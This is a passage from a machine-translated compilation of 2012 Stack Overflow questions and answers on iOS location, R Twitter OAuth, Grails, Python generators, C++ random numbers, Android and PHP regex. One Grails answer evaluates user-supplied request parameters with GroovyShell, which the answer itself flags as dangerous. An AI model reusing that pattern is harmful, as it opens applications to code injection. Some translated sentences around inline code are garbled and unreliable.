@property (strong, nonatomic) IBOutlet UILabel *verticalAccuracyLabel;
@property (strong, nonatomic) IBOutlet UILabel *distanceTraveledLabel;

@end

// BIDViewController.m :

#import "BIDViewController.h"

@interface BIDViewController ()

@property (strong, nonatomic)CLLocation *currentLocation;
@property (strong, nonatomic)CLLocation *lastLocation;
@property CLLocationDistance distanceTraveled;

@end

@implementation BIDViewController

@synthesize latitudeLabel;
@synthesize locationManager;
@synthesize longitudeLabel;
@synthesize startingPoint;
@synthesize altitudeLabel;
@synthesize distanceTraveledLabel;
@synthesize horizontalAccuracyLabel;
@synthesize verticalAccuracyLabel;
@synthesize currentLocation;
@synthesize lastLocation;
@synthesize distanceTraveled;

- (void)viewDidLoad
{
    [super viewDidLoad];

    locationManager = [[CLLocationManager alloc] init];
    locationManager.delegate = self;
    locationManager.desiredAccuracy = kCLLocationAccuracyBest;
    //locationManager.distanceFilter = 10.0f;

    [locationManager startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray *)locations
{
    if (startingPoint == nil) {
        startingPoint = [locations lastObject];
        NSLog(@"first time -- locations.count = %d", locations.count);
        distanceTraveled = 0;
        distanceTraveledLabel.text = @"0m";
    }
    else if (locations.count > 1) {
        NSLog(@"into the else if -- locations.count = %d", locations.count);
        lastLocation = locations[locations.count -2];
        distanceTraveled = distanceTraveled + [currentLocation distanceFromLocation:lastLocation];
        distanceTraveledLabel.text = [NSString stringWithFormat:@"%gm", distanceTraveled];
    }

    NSLog(@"locations.count = %d", locations.count);

    currentLocation = [locations lastObject];

    latitudeLabel.text =
        [NSString stringWithFormat:@"%g\u00B0", currentLocation.coordinate.latitude];
    longitudeLabel.text =
        [NSString stringWithFormat:@"%g\u00B0", currentLocation.coordinate.longitude];
    horizontalAccuracyLabel.text =
        [NSString stringWithFormat:@"%gm", currentLocation.horizontalAccuracy];
   verticalAccuracyLabel.text =
        [NSString stringWithFormat:@"%gm", currentLocation.verticalAccuracy];
    altitudeLabel.text =
        [NSString stringWithFormat:@"%gm", currentLocation.altitude];

}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error
{
    NSString *errorString = [[NSString alloc] init];

    switch (error.code) {
        case kCLErrorLocationUnknown:
            errorString = @"Location unknown";
            break;

        case kCLErrorDenied:
            errorString = @"Access denied";
            break;

        case kCLErrorNetwork:
            errorString = @"No network coverage";
            break;

        case kCLErrorDeferredAccuracyTooLow:
            errorString = @"Accuracy is too low to display";
            break;

        default:
            break;
    }

    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Error getting location"
                                                    message:errorString
                                                   delegate:nil
                                          cancelButtonTitle:@"OK"
                                          otherButtonTitles:nil];
    [alert show];
}

@end 
```

这是记录器的样子：

```
2012-11-21 11:28:34.882 WhereAmI[652:11c03] first time -- locations.count = 1
2012-11-21 11:28:34.897 WhereAmI[652:11c03] locations.count = 1
2012-11-21 11:28:35.835 WhereAmI[652:11c03] locations.count = 1
2012-11-21 11:28:36.835 WhereAmI[652:11c03] locations.count = 1
2012-11-21 11:28:37.836 WhereAmI[652:11c03] locations.count = 1
2012-11-21 11:28:38.836 WhereAmI[652:11c03] locations.count = 1
2012-11-21 11:28:39.837 WhereAmI[652:11c03] locations.count = 1
2012-11-21 11:28:40.837 WhereAmI[652:11c03] locations.count = 1
2012-11-21 11:28:41.838 WhereAmI[652:11c03] locations.count = 1
2012-11-21 11:28:42.839 WhereAmI[652:11c03] locations.count = 1 
```

等等...

有什么建议吗？谢谢大家，一如既往，抱歉英语不好！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T13:12:28.103

模拟器不会返回多个位置，因为它使用您计算机的位置，因此您可以获得 Wi-Fi 的精度，仅此而已，除非您在运行时更改到其他地方的另一个 Wi-Fi 网络，否则它永远不会返回更高的精度/不同的位置。

如果您在移动的实际设备上进行测试，或者如果该设备首先为您提供蜂窝塔精度，然后是 Wi-Fi，然后是 GPS 精度，您将在阵列中收到多个位置。

希望这可以清除它。

# r - 如何在给定时间段内获得所有（即 1500 多条）带有给定主题标签的推文？

> ID：13491597
> 
> 赞同：3
> 
> 时间：2012-11-21T10:49:19.227
> 
> 标签：r, twitter, oauth

我正在尝试获取过去两年（例如 1 月 11 日至 12 月 12 日）包含主题标签（例如 #rstats）的所有推文。但是，使用 searchTwitter 最多只能返回 1500 条。我认为（基于一些阅读）我必须登录才能查询超过 1500 条推文。现在，我在使用 R 的 Mac OS 上（如果存在简单直接的解决方案，我愿意使用 Python）并且无法登录；运行这个

```
requestURL <- "https://api.twitter.com/oauth/request_token"
accessURL <- "http://api.twitter.com/oauth/access_token"
authURL <- "http://api.twitter.com/oauth/authorize"
twitCred <- OAuthFactory$new(consumerKey = twt.name, consumerSecret = twt.pass, requestURL = requestURL, accessURL = accessURL, authURL = authURL)
twitCred$handshake() 
```

返回：

```
Error in twitCred$handshake():
Invalid response from site, please check your consumerKey and consumerSecret and try again. 
```

如果有人帮助我完成这项工作，我将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:57:49.970

您是否尝试将所有 https 替换为 http？

你见过这个吗：

[为了注册 OAuth，我应该在哪里寻找消费者密钥和秘密？](https://stackoverflow.com/questions/7713244/where-should-i-look-for-consumers-key-and-secret-in-order-to-register-oauth)

# grails - 如何从控制器中的参数中提取列表

> ID：13491600
> 
> 赞同：1
> 
> 时间：2012-11-21T10:49:27.677
> 
> 标签：grails, groovy

我有一个从视图传入的列表列表，如下所示：

```
[lists:[["e","q"],["t","w"]], action:save, controller:newReport] 
```

在我的控制器中

```
def lists = params.lists; 
```

列表将是一个字符串，其值为 "[["e","q"],["t","w"]]"

我应该如何遍历列表以获取每个子列表？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T09:33:59.557

使用 JSON.parse：

```
groovy:000> lists = JSON.parse("[['e', 'q'], ['w', 'q']]")
===> [["e","q"],["w","q"]]
groovy:000> lists.each { list -> println list }
[e, q]
[w, q]
===> [["e","q"],["w","q"]]
groovy:000> lists[0].each { entry -> println entry }
e
q
===> ["e","q"] 
```

这比 GroovyShell 安全得多。这样您就不必考虑如何保护它或如何使用正则表达式来解析字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:25:48.110

Grails 有一个很好的[类型转换](http://mrhaki.blogspot.com.br/2010/02/grails-goodness-type-conversion-on.html)，你可以在`params`.

你试过`params.list('lists')`吗？

**编辑：**

现在在这里尝试，在您的情况下，您可以评估要在列表中转换的表达式：

```
params.lists = '[["e","q"],["t","w"]]'
def listValues = new GroovyShell().evaluate(params.lists)
listValues.each { list ->
  println list
  println list.class.canonicalName
} 
```

**EDIT2**：如果用户发送其他不期望的内容，这可能会很危险。[您可以按照本文](http://www.jroller.com/melix/entry/customizing_groovy_compilation_process)中的说明保护您的 GroovyShell 。

# python - 在 Python 中生成时，“()”和“[]”有什么区别？

> ID：13491601
> 
> 赞同：7
> 
> 时间：2012-11-21T10:49:34.227
> 
> 标签：python, list, tuples, generator

有一个列表：nodes = [20, 21, 22, 23, 24, 25]。

我使用了两种方法来生成新的二维对象：

```
tour1 = (((a,b) for a in nodes )for b in nodes)
tour2 = [[(a,b) for a in nodes ]for b in nodes] 
```

*tour1*的类型是生成器，而*tour2*是列表：

```
In [34]: type(tour1)
Out[34]: <type 'generator'>

In [35]: type(tour2)
Out[35]: <type 'list'> 
```

我想知道为什么*tour1*不是元组？谢谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-21T10:51:53.213

元组的语法不是括号`()`，而是逗号`,`。您可以创建一个不带括号的元组：

```
x = 1, 2, 3 
```

如果要从推导式创建元组，只需使用`tuple`构造函数：

```
tuple(tuple((a,b) for a in nodes )for b in nodes) 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-11-21T10:53:08.523

根本区别在于第一个是生成器表达式，第二个是列表推导式。前者只在需要时产生元素，而后者总是在运行推导时产生整个列表。

有关详细信息，请参阅[生成器表达式与列表理解](https://stackoverflow.com/questions/47789/generator-expressions-vs-list-comprehension)

Python 中没有“元组理解”之类的东西，这似乎是您对第一种语法的期望。

如果你想`tour1`变成一个元组的元组，你可以使用以下内容：

```
In [89]: tour1 = tuple(tuple((a,b) for a in nodes )for b in nodes)

In [90]: tour1
Out[90]: 
(((20, 20), (21, 20), (22, 20), (23, 20), (24, 20), (25, 20)),
 ((20, 21), (21, 21), (22, 21), (23, 21), (24, 21), (25, 21)),
 ((20, 22), (21, 22), (22, 22), (23, 22), (24, 22), (25, 22)),
 ((20, 23), (21, 23), (22, 23), (23, 23), (24, 23), (25, 23)),
 ((20, 24), (21, 24), (22, 24), (23, 24), (24, 24), (25, 24)),
 ((20, 25), (21, 25), (22, 25), (23, 25), (24, 25), (25, 25))) 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-21T10:53:37.353

因为语法`(x for x in l)`是所谓的“生成器表达式”：请参阅[http://docs.python.org/2/reference/expressions.html#generator-expressions](http://docs.python.org/2/reference/expressions.html#generator-expressions)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-21T10:52:05.407

它是生成器，但您可以简单地将其更改为元组：

```
>>> (i for i in xrange(4))
<generator object <genexpr> at 0x23ea9b0>
>>> tuple(i for i in xrange(4))
(0, 1, 2, 3) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-11-21T11:36:27.360

添加... 实际上，生成器表达式根本不需要括号。只有当生成器表达式产生*错误的语法*时才需要它们——这里是因为赋值。将生成器传递给函数（或类似函数）时，不需要括号。尝试以下操作：

```
tour3 = list(list((a,b) for a in nodes) for b in nodes) 
```

它产生的结果与您的`tour2`. 这样，您可以将`[`as 视为 的语法糖`list(`，而 the`]`是与 . 相关的语法糖`)`。但是，编译器对它的编译方式不同。您可以尝试*反汇编*（您需要传递一个函数）：

```
>>> import dis
>>> def fn1():
...   return list(list((a,b) for a in nodes) for b in nodes)
...
>>> def fn2():
...   return [[(a,b) for a in nodes ]for b in nodes]
...
>>> dis.dis(fn1)
  2           0 LOAD_GLOBAL              0 (list)
              3 LOAD_CONST               1 (<code object <genexpr> at 000000000229A9B0, file "<stdin>", line 2>)
              6 MAKE_FUNCTION            0
              9 LOAD_GLOBAL              1 (nodes)
             12 GET_ITER
             13 CALL_FUNCTION            1
             16 CALL_FUNCTION            1
             19 RETURN_VALUE
>>> dis.dis(fn2)
  2           0 BUILD_LIST               0
              3 LOAD_GLOBAL              0 (nodes)
              6 GET_ITER
        >>    7 FOR_ITER                37 (to 47)
             10 STORE_FAST               0 (b)
             13 BUILD_LIST               0
             16 LOAD_GLOBAL              0 (nodes)
             19 GET_ITER
        >>   20 FOR_ITER                18 (to 41)
             23 STORE_FAST               1 (a)
             26 LOAD_FAST                1 (a)
             29 LOAD_FAST                0 (b)
             32 BUILD_TUPLE              2
             35 LIST_APPEND              2
             38 JUMP_ABSOLUTE           20
        >>   41 LIST_APPEND              2
             44 JUMP_ABSOLUTE            7
        >>   47 RETURN_VALUE 
```

所以你可以看到它是不同的（即看起来像一个语法糖，但它不是）。不幸的是，Python 不知道如何反汇编生成器：

```
>>> g = (list((a,b) for a in nodes) for b in nodes)
>>> dis.dis(g)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "C:\Python27\lib\dis.py", line 49, in dis
type(x).__name__
TypeError: don't know how to disassemble generator objects 
```

**更新：**

当查看上面的反汇编代码时，人们可能会觉得`fn1`它更快（具有更短的代码）。但是，在所有语言中的所有函数调用的情况下，函数调用看起来都比展开的代码短。它没有说明被调用代码的内部结构。Python之禅的几点：

```
>>> import this
The Zen of Python, by Tim Peters
...
Readability counts.
...
In the face of ambiguity, refuse the temptation to guess.
There should be one-- and preferably only one --obvious way to do it.
...
>>> 
```

有`timeit`标准模块来测量执行时间。让我们尝试在两种情况下使用它：

```
>>> import timeit
>>> t = timeit.Timer('list(list((a,b) for a in nodes) for b in nodes)',
...                  'nodes = [20, 21, 22, 23, 24, 25]')
>>> print("%.2f usec/pass" % (1000000 * t.timeit(number=100000)/100000))
17.74 usec/pass 
```

现在用方括号：

```
>>> t = timeit.Timer('[[(a,b) for a in nodes ]for b in nodes]',
...                  'nodes = [20, 21, 22, 23, 24, 25]')
>>> print("%.2f usec/pass" % (1000000 * t.timeit(number=100000)/100000))
7.14 usec/pass
>>> 
```

这清楚地表明通过创建列表列表`[ ]`更快。原因是函数调用较少。Python 编译器可以生成更直接的代码。

# gwt - 是否可以在 UIBinder XML 布局中使用参数化的 GWT 消息？

> ID：13491602
> 
> 赞同：3
> 
> 时间：2012-11-21T10:49:35.937
> 
> 标签：gwt, internationalization, messages

我有一些消息，在 com.google.gwt.i18n.client.Messages 接口实现中描述并与一些资源文件绑定。我使用消息而不是常量，因为我希望能够在获取消息时指定一些动态参数。即我的消息被定义为“一些文本 {0} - 是我的参数的值”，我使用相应的方法调用和一个（在这种情况下为 int）参数。

一个问题是：如何在 UIBinder XML 布局中使用我的参数化消息？

想象一下我有一个按钮，我想设置它的标签。标签取决于一些参数，例如按钮编号。所以我需要一条看起来像这样的消息：“我的按钮否 {0}”。如何在 XML 布局中指定此参数？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:24:36.917

你不能；您必须从 Java 代码中设置标签。

# share - 如何从 Alfresco Share 网页脚本中检索主机名

> ID：13491604
> 
> 赞同：2
> 
> 时间：2012-11-21T10:49:36.520
> 
> 标签：share, alfresco

我想知道如何从 Surf 中的根对象中知道当前主机名。

我正在编写一个服务于 JNLP 的 webscript，所以我没有页面上下文，并且`${url.context}`只返回`/share`.

我正在寻找如何获得主机名`http://foobar.com`，或者是否可以从服务器端获得主机名。

我已经通过：[http](http://wiki.alfresco.com/wiki/Surf_Platform_-_Freemarker_Template_and_JavaScript_API#) ://wiki.alfresco.com/wiki/Surf_Platform_-_Freemarker_Template_and_JavaScript_API#没有成功

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T13:51:27.130

在存储库方面，Alfresco 和 Share 的 URL 是已知的。[您可以从SysAdminParams](http://dev.alfresco.com/resource/docs/java/repository/org/alfresco/repo/admin/SysAdminParams.html)获取所有单独的部分，并且可以使用[UrlUtils](http://dev.alfresco.com/resource/docs/java/repository/org/alfresco/util/UrlUtil.html)将不同的部分连接在一起，以便提供完整的 URL。

但据我所知，这些细节只保存在 Alfresco 存储库层，永远不会传递给 Share。Share 中的所有绝对 URL 似乎都是在 Repo 中生成并发送过来的

然后，一种选择是让您将 webscript 更改为 repo webscript 而不是共享 webscript。这将使您可以访问适当的 bean。Share 将为您代理 Repo webscripts，因此您仍然可以以登录用户的身份直接在 Share 中访问它。您需要一个有点像`/share/proxy/alfresco/my/web/script`访问它们的 URL。

否则，创建一个公开 SysAdminParams 和共享 URL 的有用位的新 repo webscript，并让您的共享 webscript 获取它（可能使用缓存）。也有很多这样的例子可以使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T12:22:46.377

你有没有尝试过`${url.serverPath}`

或者你可以使用默认的 alfresco-global.properties 像

```
share.context=share
share.host=foobar.com
share.port=80
share.protocol=http 
```

这些属性可以在任何你想要的地方注入，看这里：[Accessing values from Alfresco's alfresco-global.properties file](https://stackoverflow.com/questions/10452800/accessing-values-from-alfrescos-alfresco-global-properties-file?rq=1)

您唯一需要注意的是，这些属性与存储库相关。因此，您可以编写一个 repo webscript，它将所有道具提供给 Share。

而且由于您使用的是 Share，因此可以轻松地使用客户端 JavaScript 来确定主机；）。

# jquery - Jquery Banner Slider 在 IE 7 和 IE 8 中不起作用

> ID：13491609
> 
> 赞同：1
> 
> 时间：2012-11-21T10:49:54.530
> 
> 标签：jquery, html, css

我在我的 Magento 网站主页上添加了横幅滑块。它在除 Internet Explorer 之外的所有浏览器中都能完美运行。

所以，请提出任何想法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T08:23:28.183

如果你有 Jquery Slider 不能在 IE 7 和 IE 8 中工作。

然后您必须应用以下代码。

getSkinUrl(); ?>css/yourCSS" type="text/css" />

```
 <!--[if IE]>
             <style type="text/css">
                 .timer { display: none !important; }
                 div.caption { background:transparent; filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000,endColorstr=#99000000);zoom: 1; }
            </style>
        <![endif]-->

        <script type="text/javascript">
          var jQuery = jQuery.noConflict();
             jQuery(window).load(function() {
             jQuery('#featured').orbit();
        });
    </script> 
```

# jquery - jquery模板只调用一次函数

> ID：13491610
> 
> 赞同：1
> 
> 时间：2012-11-21T10:49:54.397
> 
> 标签：jquery, jquery-templates

```
<script id="movieTemplate" type="text/x-jquery-tmpl"> 
  <tr class='title'>
       <th>Director </td>
       <th>Name </th></tr> 
  <tr class='title'>
       <td>${Name}</td>
       <td>${Director}</td></tr>

</script>

$( "#movieTemplate" ).tmpl( movies ).appendTo( "#movieList" ); 
```

在这个模板中，我只想调用一次标题。但是因为我不止一次调用模板，所以它调用了所有次数，并且我被打印了多次。

我只想打印一次（执行）：

```
<th>Director </td>
       <th>Name </th></tr> 
```

如何使用模板执行此操作。我错过了什么吗

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T04:16:16.837

在调用之前

```
<tbody id="movieList"></tbody>, I called

       <th> Director</th>.

Its like:

       <table>
       <th> Director </th>
   and than the template 
```

# winforms - Datagrid以编程方式取消选择单元格

> ID：13491612
> 
> 赞同：2
> 
> 时间：2012-11-21T10:50:02.913
> 
> 标签：winforms, compact-framework

我正在使用一个 PDA，其中有一个、和`DataGrid`的列表。用户扫描条形码，我在 DataGrid 中搜索匹配项，然后选择与条形码关联的项目所在的行。我将 scanStatus 设置为.`itemNames``barcode``scanStatus``true`

我在用户触摸屏幕时遇到问题，DataGrid 的行都被取消选中。

所以我尝试处理 DataGrid 的`Click`,`DoubleClick`和`MouseUp`事件。我遍历我的网格，其中 scanStatus 为 true 并调用`grid.Select(iteratorIndex)`else 我调用 `grid.UnSelect(iteratorIndex)`.

这将重新选择扫描项目的行。但是用户单击的最后一个单元格也保持选中状态。如何取消选择该单元格？我在发布之前进行了搜索，唯一与我的情况相匹配的是[这个线程](http://www.pcreview.co.uk/forums/datagrid-cell-de-select-cell-t1360634.html)，我在那里尝试了建议，但它并没有回答我的问题。

# c - 选择可移植的加密库

> ID：13491618
> 
> 赞同：4
> 
> 时间：2012-11-21T10:50:12.243
> 
> 标签：c, encryption, package, shared-libraries, portability

我正在开发一个实用程序，除其他外，它使用用户提供的密码加密数据。我没有太多编写好的可移植代码的经验，所以我正在努力学习如何做好它。用于执行散列和加密功能的最佳库是什么？

澄清一下，我不是在寻找具有最佳功能的库，而是在寻找可在大多数操作系统上使用并且通常安装在许多操作系统上的库。我知道我不会找到在大多数操作系统上默认安装的库，但我想选择一个为大多数用户提供最简单安装的库。

我查看了 Windows 7 (Cygwin)、Mac OS X 10.8、Debian 6.0.5 和 Ubuntu 12.04.1 LTS 的原版安装，它们唯一的共同点是`crypt`我理解不推荐，因为使用了弱具有有限密钥大小的加密算法。

目前我正在考虑使用`libmcrypt`，`mhash`因为它们在 Debian 和 Ubuntu 上都可以通过 aptitude 获得（据我所知，大多数其他 Linux 发行版），可以通过 MacPorts 或 Homebrew 安装在 Mac OS X 上，并且可以在用于 Windows 的 Cygwin 安装程序。它们也可用于 FreeBSD、OpenBSD 和 NetBSD。

在选择要使用的最佳库以及指出我可能没有考虑过的其他因素时，我非常感谢一些帮助。

# c# - 如何滚动到scrollviewer中的第n个项目

> ID：13491620
> 
> 赞同：0
> 
> 时间：2012-11-21T10:50:13.937
> 
> 标签：c#, xaml, scrollview

我正在为 Windows 8 编写应用程序作为大学项目。我所拥有的如下：

```
<ScrollViewer Background="Green" Name="readingSV"  Grid.Column="1" HorizontalAlignment="Stretch" VerticalAlignment="Stretch" BorderBrush="Black" BorderThickness="1" Padding="15" VerticalScrollBarVisibility="Hidden" VerticalScrollMode="Auto" HorizontalScrollMode="Disabled">  
    <StackPanel Orientation="Vertical"  Name="readingSP">  
        <TextBlock Name="tb1" />  
        <TextBlock Name="tb2" />  
        <TextBlock Name="tb3" />  
        <TextBlock Name="tb5" />  
        <TextBlock Name="tb6" />  
        <TextBlock Name="tb7" />  
        <TextBlock Name="tb8" />  
        <TextBlock Name="tb9" />  
        <TextBlock Name="tb10" />  
        <TextBlock Name="tb11" />  
        <TextBlock Name="tb12" />  
        <TextBlock Name="tb13" />  
        <TextBlock Name="tb14" />  
        <TextBlock Name="tb15" />  
    </StackPanel>  
</ScrollViewer> 
```

我想查看滚动查看器以调整到第 n 个项目，例如加载时的 tb15...

我曾尝试寻求帮助，但找不到易于理解的答案

我实际上是在代码隐藏中创建文本块并将它们添加到滚动查看器中的堆栈面板中，文本块将填充一本书中的文本行，比如说......每行一个文本块。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T02:21:32.210

一点数学......毕竟所有元素都到位。我计算了滚动查看器的总高度，并根据其实际高度计算了文本框的位置。

# c++ - std::uniform_real_distribution 和 rand()

> ID：13491621
> 
> 赞同：12
> 
> 时间：2012-11-21T10:50:16.487
> 
> 标签：c++, random

为什么`std::uniform_real_distribution`比`rand()`作为随机数生成器更好？有人可以举个例子吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-21T11:02:14.320

首先，应该明确提出的比较是荒谬的。

`uniform_real_distribution`不是随机数生成器。`uniform_real_distribution`如果没有传递给它的随机数生成器，就无法从 a 生成随机数[`operator()`](http://en.cppreference.com/w/cpp/numeric/random/uniform_real_distribution/operator%28%29)。`uniform_real_distribution`将该随机数生成器的输出“整形”为均匀的实数分布。您可以将各种随机数生成器插入到一个发行版中。

我不认为这是一个体面的比较，所以我将使用`uniform_real_distribution`C++11 随机数生成器与之进行比较`rand()`。

另一个使比较变得不那么有用的明显区别`uniform_real_distribution`是用于产生浮点数，而`rand()`产生整数的事实。

也就是说，有几个理由更喜欢新设施。

`rand()`是全局状态，而在使用设施时`<random>`不涉及全局状态：您可以拥有任意数量的生成器和分布，并且它们都彼此独立。

`rand()`没有关于生成的序列质量的规范。C++11 中的随机数生成器都经过了明确的规定，分布也是如此。`rand()`实现可能并且在实践中质量非常差，而且不是很统一。

`rand()`提供预定义范围内的随机数。由程序员将该范围调整到所需范围。*这不是一个简单的任务*。不，使用 % 的东西是不够的。以如此幼稚的方式进行这种调整很可能会破坏原始序列中的任何一致性。`uniform_real_distribution`正确地为您进行此范围调整。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-21T11:04:22.023

真正的比较是`rand`C++11 标准库提供的随机数引擎之一。`std::uniform_real_distribution`只是根据一些参数（例如，10 到 20 之间的实际值）分配引擎的输出。您也可以制作一个`rand`在幕后使用的引擎。

现在标准库随机数引擎和使用普通旧引擎之间的区别在于`rand`保证和灵活性。`rand`不保证随机数的质量——事实上，许多实现在它们的分布和周期上都有缺点。如果你想要一些高质量的随机数，那就不行了`rand`。然而，随机数引擎的质量是由它们的算法定义的。当您使用 时`std::mt19937`，您确切地知道您从这个经过全面测试和分析的算法中得到了什么。不同的引擎具有您可能喜欢的不同品质（空间效率、时间效率等），并且都是可配置的。

这并不是说你`rand`不在乎太多时就应该使用。您不妨立即开始使用 C++11 中的随机数生成工具。没有缺点。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-21T10:52:05.423

原因实际上在于函数的名称，即随机数分布的均匀性`std::uniform_real_distribution`比提供的随机数均匀分布要好`rand()`。

的分布`std::uniform_real_distribution`当然是在给定的区间 [a,b) 之间。

本质上，这就是说，当你要求一个介于 1 和 10 之间的随机数时，得到 5 或得到 9 或任何其他可能值的概率*密度*`std::uniform_real_distribution`与你使用`rand()`并调用它时一样大几次，得到 5 而不是 9 的概率可能不同。

# android - AVD 管理器将不再在 Eclipse 中启动

> ID：13491622
> 
> 赞同：6
> 
> 时间：2012-11-21T10:50:18.780
> 
> 标签：android, eclipse, avd, android-sdk-manager

当我在 Eclipse 中按下 AVD Manager 按钮时，**什么也没有发生**（我的意思是什么）......

当我尝试运行应用程序时，我收到消息“没有找到兼容的目标。你想添加一个新的 Android 虚拟设备吗？当我点击“是”时，我得到了“Android 设备选择器”窗口。这完全是空的（没有列出任何设计）。所以我检查了单选按钮“启动新的 Android 虚拟设备”，它激活了“管理器”按钮。但是当我点击这个按钮时，**什么也没有发生**......

因此，由于某种原因，我的 AVD 管理器无法启动。

PS：当我进行“Hello World”练习时，**AVD 管理器确实工作过。**由于某种原因，它停止了工作。我尝试重新安装整个 SDK 和 Eclipse，但无济于事。我使用 Windows 7。

有什么建议么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T12:20:01.210

我有同样的问题。所以我卸载了 sdk (C:\Program Files (x86)\Android\android-sdk) 并**删除了 C:\Users\hp.android 文件夹** （确保删除此文件夹，否则即使重新安装后问题仍然存在）。重新安装后一切正常...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:54:06.640

尝试在 Eclipse 的 Android SDK Manager 中安装或重新安装 AVD 系统映像。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:02:46.460

您可能没有设置 sdk 路径。这样做，

```
step1: go to windows menu option 

step2: click on preference,

step3: select android

step 4: change the android sdk path and restart eclipse 
```

# xml - Spring 3.0.3 SAXParseException 与 mvc:resources

> ID：13491626
> 
> 赞同：1
> 
> 时间：2012-11-21T10:50:29.800
> 
> 标签：xml, spring-mvc

我的问题与这个非常[相似](https://stackoverflow.com/questions/9896885/spring-3-1-1-saxparseexception-with-mvcresources)。不过，我找不到错误:-(

这是我的 myapp-servlet.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans
    xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:p="http://www.springframework.org/schema/p"
    xmlns:mvc="http://www.springframework.org/schema/mvc"
    xmlns:context="http://www.springframework.org/schema/context"
    xsi:schemaLocation="
http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
http://www.springframework.org/schema/mvc
http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd
http://www.springframework.org/schema/context
http://www.springframework.org/schema/context/spring-context-3.0.xsd">

    <context:component-scan base-package="de.myapp.controller" />

    <mvc:resources mapping="/resources/**" location="/resources/" />

    <bean id="viewResolver"
        class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="viewClass"
            value="org.springframework.web.servlet.view.JstlView" />
        <property name="prefix" value="/WEB-INF/views/" />
        <property name="suffix" value=".jsp" />
    </bean>

</beans> 
```

我已经检查了几次xml，甚至是[这个](https://stackoverflow.com/questions/9896885/spring-3-1-1-saxparseexception-with-mvcresources)问题中提到的答案。我仍然得到`Line 15 in XML document from ServletContext resource [/WEB-INF/myapp-servlet.xml] is invalid; nested exception is org.xml.sax.SAXParseException: cvc-complex-type.2.4.c: The matching wildcard is strict, but no declaration can be found for element 'mvc:resources'.`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T12:36:54.410

只需使用 > 3.0.3 的版本，因为此功能从 3.0.4 版本开始可用！我用 3.2 版尝试了我的问题中引用的解释。它完美无缺！

# php - 正则表达式，如何在 PHP 中使用可选引号和电子邮件地址拆分名称

> ID：13491632
> 
> 赞同：1
> 
> 时间：2012-11-21T10:50:40.560
> 
> 标签：php, regex

我有以下字符串：

> **“约翰尼测试”** <johnny@test.com>，**杰克**<another@test.com>，**“斯科特萨默斯”** <scotts@test.com> ...

多词名称用双引号括起来

我需要一个包含以下结果的数组：

```
array(   
   array('nom' => 'Johnny Test', 'adresse' => 'johnny@test.com'),
   array('nom' => 'Jack', 'adresse' => 'another@test.com'),     
   array('nom' => 'Scott Summers', 'adresse' => 'scotts@test.com') 
   ... 
   ) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:53:54.543

```
preg_match_all('/(.*?)\s<(.*?)>,?/', $string, $hits);
print_r($hits); 
```

像这样的东西应该工作。

如果您`\r\n`在字符串中使用它，请在使用正则表达式解析它之前使用它：

```
$chars=array("\r\n", "\n", "\r");
$string=str_replace($chars, '', $string); 
```

更新：我用来测试的代码。

test_preg2.php：

```
<?php
$html='"Johnny Test" <johnny@test.com>,Jack <another@test.com>,"Scott Summers" <scotts@test.com>';
$chars=array("\r\n", "\n", "\r");
$html=str_replace($chars, '', $html);
preg_match_all('/(.*?)\s<(.*?)>,?/', $html,$hits);
print_r($hits);
?> 
```

输出：

```
Array ( [0] => Array ( [0] => "Johnny Test" , [1] => Jack , [2] => "Scott Summers" ) [1] => Array ( [0] => "Johnny Test" [1] => Jack [2] => "Scott Summers" ) [2] => Array ( [0] => johnny@test.com [1] => another@test.com [2] => scotts@test.com ) ) 
```

更新 2：字符串已使用 htmlentities() 格式化。（问题的示例字符串是错误的人......）

```
preg_match_all('/(.*?)\s&lt;(.*?)&gt;,?/', $string, $hits);
print_r($hits); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:09:27.447

```
$all  = array();
$data = '"Johnny Test" <johnny@test.com>,Jack <another@test.com>,"Scott Summers" <scotts@test.com>';
$emails = explode(',', $data);
foreach ($emails as $email)
{
    if (preg_match('/(.*) <(.*)>/', $email, $regs)) {
        $all[] = array(
            'nom'     => trim($regs[1], '"'), 
            'adresse' => $regs[2],
        );
    }
}

print_r($all); 
```

# jquery - 验证完成后重定向jQuery

> ID：13491633
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:50:46.283
> 
> 标签：jquery

在验证表单中的所有字段后，我想重定向到另一个页面。我在 CSS 中这样做。我想在 CSS 中验证后触发重定向方法。

我在网上看到我们可以使用：

```
